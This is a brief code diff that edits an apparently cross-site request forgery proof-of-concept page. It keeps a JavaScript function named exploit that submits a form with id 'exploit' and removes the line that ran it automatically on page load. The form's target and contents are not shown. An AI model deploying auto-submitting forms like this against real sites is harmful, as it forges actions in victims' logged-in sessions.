@@ -8,4 +8,3 @@ function exploit () {
 var xploit = document.getElementById("exploit");
 xploit.submit();
 }
-window.onload = exploit;
